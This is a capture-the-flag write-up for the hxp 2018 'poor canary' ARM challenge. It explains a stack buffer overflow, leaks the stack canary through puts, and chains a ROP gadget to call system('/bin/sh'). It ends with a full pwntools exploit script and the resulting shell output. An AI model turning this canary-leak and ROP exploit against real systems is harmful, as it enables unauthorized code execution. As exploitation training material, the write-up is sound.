# hxp 2018 poor canary

This writeup is based off of: https://ctftime.org/writeup/12568


If you want to use gdb on this challenge, if you don't already you will have to install and use `gdb-multiarch`:

```
$   sudo apt-get install gdb-multiarch
$   gdb-multiarch
```

Let's take a look at the binary:

```
$	file canary
canary: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3599326b9bf146191588a1e13fb3db905951de07, not stripped
$	pwn checksec canary
[*] '/home/guyinatuxedo/Desktop/canary/poor_canary/canary'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

So we can see it is a 32 bit ARM binary, with a stack canary and non executable stack. In order to run this challenge on linux, you will need to install `qemu-user`:

```
$	sudo apt-get install qemu-user
```

Now let's run the binary:

```
$	qemu-arm canary
Welcome to hxp's Echo Service!
> 15935728
15935728
```

So we can see it essentially just scans in input, and the prints it. Let's take a look at the source code which we are given:

```
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    char buf[40];
    puts("Welcome to hxp's Echo Service!");
    while (1)
    {
        printf("> ");
        ssize_t len = read(0, buf, 0x60);
        if (len <= 0) return 0;
        if (buf[len - 1] == '\n') buf[--len] = 0;
        if (len == 0) return 0;
        puts(buf);
    }
}
const void* foo = system;
```

So we can see here, that there is a bug where it scans `0x60` `96` bytes of data in a `40` byte buffer, so we have a buffer overflow. We can verify with this:

```
$	python -c 'print "0"*0x60' | qemu-arm canary
Welcome to hxp's Echo Service!
> 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000X
> *** stack smashing detected ***: canary terminated
qemu: uncaught target signal 6 (Aborted) - core dumped
Aborted (core dumped)
```

### Canary

The first thing we will need to get around is the stack canary. To do this, we can use the puts statement. Essentially how this will work, is we will insert 41 bytes worth of data. This will bring our data right up to the stack canary, and overwrite the least significant byte of it. When puts is called on a string, it prints characters until it reaches a null byte. Since there will be no null bytes between the start of our input and the stack canary, it will also print out the stack canary so we will have it. However the reason why we overwrite the least significant byte of the stack canary, is because the stack canary is null terminated, meaning that it is a null byte that would stop this type of leak from happening. However since we know what the byte is, we can just read in the other three bytes, slap on a null byte as the least significan byte, and we will have the stack canary.

### Calling System

Now with the source code, we can see that the function `system` has a hard coded address in the binary so we won't need an infoleak to figure out where `system` is. So we can just use a ROP gadget to call it. However we will need to find the string `/bin/sh`, which has a static address in the binary:

```
$   python Ropper.py --file canary --string "/bin/sh"


Strings
=======

Address     Value    
-------     -----    
0x00071eb0  /bin/sh

``` 

So we can see the address of "/bin/sh" is `0x71eb0`. Now we just need a ROP gadget which will pop a value into the `r0` and `pc` registers (`r0` because that is where it will expect the first argument for system, and `pc` because that is where it will expect the address which will be executed). We can use Ropper to find this

```
$   python Ropper.py --file canary | grep pop | grep r0 | grep pc
```

looking through the long list of results, we see one that works:

```
0x00026b7c: pop {r0, r4, pc};
```

This gadget will pop values into the `r0` and `pc` registers for us. It will also pop a value into the `r4` register, however we will just need to have 4 bytes of filler data there for it (it doesn't matter too much what goes there). Next we need to find out the address of `system`. We can use `objdump` for this, however not the standard version since we are dealing with ARM:

first install it:
```
$   sudo apt-get install binutils-arm-none-eabi
```

Then we can find the address:

```
$   arm-none-eabi-objdump -D canary | grep libc_system
00016d90 <__libc_system>:
   16d94:   0a000000    beq 16d9c <__libc_system+0xc>
```

Now we also need to know how much space to put after the stack canary, and before the return address. If we take a quick look at the binary in Binja, we can see that the stack canary is located `0x14` bytes above the start of the stack (we can tell that this is the stack canary, since it is a value being loaded before the stack check, which checks the stack canary):

```
ldr     r2, [sp,  #0x2c] {var_14}
ldr     r3, [r3]  {__stack_chk_guard}
cmp     r2, r3
bne     0x10590
```

So the end of the stack canary would put as at `0x10` bytes above the start of the stack. And when we take a look at when the function returns, we can see that the return address is stored at `0x4` bytes above the start of the stack. We can tell this since it is the value being popped into the `pc` register, which is how ARM returns to a different address:

```
pop     {r4, r5, pc} {__saved_r4} {__saved_r5} {var_4}
```

Since the end of the stack canary puts us at `0x10`, and the return address starts at `0x4`, that leaves us with `0x10 - 0x4 = 0xc (or 12)` bytes worth of filler data between the stack canary and the return address:

Putting it all together, this is what our payload looks like (after the stack canary leak):

```
*   40 bytes of filler data
*   4 byte stack canary
*   12 bytes of filler data to return address
*   4 byte rop gadget pop {r0, r4, pc} 0x26b7c
*   4 byte "/bin/sh" address 0x00071eb0
*   4 byte of filler
*   4 byte System address 0x16d90
```

### Exploit

Here is our finished exploit:

```
# This exploit is based off of: https://ctftime.org/writeup/12568

from pwn import *

target = process(['qemu-arm', 'canary'])

system = p32(0x16d90)
binsh = p32(0x71eb0)

# pop {r0, r4, pc}
gadget = p32(0x26b7c)

def clearInput():
    print target.recvuntil('>')

def leakCanary():
    target.send("0"*41)
    print target.recvuntil('0'*41)
    leak = target.recv(3)
    canary = u32("\x00" + leak)
    print "Stack canary: " + hex(canary)
    return canary
clearInput()

canary = leakCanary()

payload = ""
payload += "0"*40
payload += p32(canary)
payload += "1"*12
payload += gadget
payload += binsh
payload += "2"*4
payload += system

target.sendline(payload)
target.sendline("")

target.interactive()
```

and when we run it:
```
$   python exploit.py 
[+] Starting local process '/usr/bin/qemu-arm': pid 21747
Welcome to hxp's Echo Service!
>
 00000000000000000000000000000000000000000
Stack canary: 0x75fc3600
[*] Switching to interactive mode

> 0000000000000000000000000000000000000000
> $ ls
canary              qemu_canary_20190118-221712_15689.core  ROPgadget.py
canary.c          qemu_canary_20190120-214003_21552.core  Ropper.py
exploit.py          qemu_canary_20190120-214234_21607.core
peda-session-unknown.txt  qemu_canary_20190120-214255_21625.core
$ w
 21:51:30 up 18:45,  1 user,  load average: 0.07, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               Thu19   ?xdm?   3:23   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
```

just like that, we solved the challenge!
